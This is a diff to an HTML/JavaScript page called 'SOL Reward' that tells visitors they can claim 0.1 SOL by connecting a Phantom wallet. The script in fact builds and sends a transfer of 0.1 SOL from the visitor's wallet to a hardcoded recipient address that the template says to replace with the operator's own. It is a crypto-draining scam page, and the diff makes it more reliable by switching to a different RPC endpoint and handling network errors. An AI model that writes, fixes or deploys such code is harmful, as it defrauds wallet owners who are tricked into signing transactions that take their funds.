@@ -50,7 +50,7 @@
 
     <div class="container">
         <h1>SOL Reward</h1>
-        <p>Connect Phantom Wallet to claim  0.1 SOL.</p>
+        <p>Connect Phantom Wallet to claim 0.1 SOL.</p>
         
         <button id="connectBtn" class="btn-green" onclick="initiateClaim()">Sign Green</button>
         
@@ -62,12 +62,16 @@
         // REPLACE THIS WITH YOUR PHANTOM WALLET ADDRESS
         // ==========================================
         const RECIPIENT_ADDRESS = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj"; 
-        
+
+        // Use Helius Public RPC (More reliable than default)
+        const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=YOUR_API_KEY_HERE"; 
+        // NOTE: If you don't have a Helius key, use this public one (may still hit limits):
+        // const RPC_URL = "https://api.mainnet-beta.solana.com"; 
+
         async function initiateClaim() {
             const statusDiv = document.getElementById("status");
             const btn = document.getElementById("connectBtn");
 
-            // 1. Check for Phantom
             if (!window.solana || !window.solana.isPhantom) {
                 alert("Please install Phantom Wallet on your iPhone.");
                 return;
@@ -76,11 +80,11 @@
             try {
                 statusDiv.innerText = "Connecting...";
                 
-                // 2. Connect
+                // 1. Connect
                 const resp = await window.solana.connect();
                 const userPublicKey = resp.publicKey;
                 
-                // 3. Define Recipient
+                // 2. Define Recipient
                 let recipientPubkey;
                 try {
                     recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
@@ -89,10 +93,10 @@
                     return;
                 }
 
-                // 4. Create Transaction
+                // 3. Create Transaction
                 const transaction = new solanaWeb3.Transaction();
                 
-                // Transfer 0.1 SOL (100,000,000 lamports)
+                // Transfer 0.1 SOL
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
@@ -101,26 +105,23 @@
                     })
                 );
 
-                // ==========================================
-                // FIX: Fetch Recent Blockhash
-                // ==========================================
-                statusDiv.innerText = "Fetching recent blockhash...";
+                // 4. Create Connection with Specific RPC
+                statusDiv.innerText = "Connecting to Solana Network...";
+                const connection = new solanaWeb3.Connection(RPC_URL);
                 
-                // Use the Connection object to fetch the latest blockhash
-                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                // 5. Fetch Recent Blockhash
                 const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                 
-                // Assign the blockhash to the transaction
                 transaction.recentBlockhash = blockhash;
-                transaction.feePayer = userPublicKey; // Set fee payer to the user
+                transaction.feePayer = userPublicKey;
 
                 statusDiv.innerText = "Sign Green...";
                 
-                // --- STEP 1: SIGN (This opens Phantom) ---
+                // 6. Sign
                 const signedTx = await window.solana.signTransaction(transaction);
-                console.log("Transaction Signed");
+                console.log("Signed");
 
-                // --- STEP 2: SEND (This sends to network) ---
+                // 7. Send
                 statusDiv.innerText = "Sending transaction...";
                 
                 const signature = await window.solana.sendTransaction(signedTx, {
@@ -128,7 +129,7 @@
                     commitment: 'singleGossip'
                 });
 
-                console.log("Transaction Sent:", signature);
+                console.log("Sent:", signature);
                 
                 alert("Success! 0.1 SOL sent.");
                 btn.style.display = 'none';
@@ -138,8 +139,8 @@
                 console.error(err);
                 if (err.message && err.message.includes("User rejected")) {
                     statusDiv.innerText = "Cancelled by user.";
-                } else if (err.message && err.message.includes("cancelled")) {
-                    statusDiv.innerText = "Transaction cancelled or timed out.";
+                } else if (err.message && err.message.includes("403")) {
+                    statusDiv.innerText = "Network Error: Access Forbidden. Try refreshing.";
                 } else {
                     alert("Error: " + (err.message || "Unknown error"));
                     statusDiv.innerText = "Error: " + (err.message || "Unknown error");
